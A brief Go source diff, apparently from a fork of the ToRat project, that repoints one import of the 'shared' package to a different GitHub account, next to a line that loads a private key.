@@ -11,7 +11,7 @@ import (
 	"log"
 	"os"
 
-	"github.com/lu4p/ToRat/shared"
+	"github.com/WildToastyMop/ToRat/shared"
 )
 
 var privateKey = loadPrivateKey()
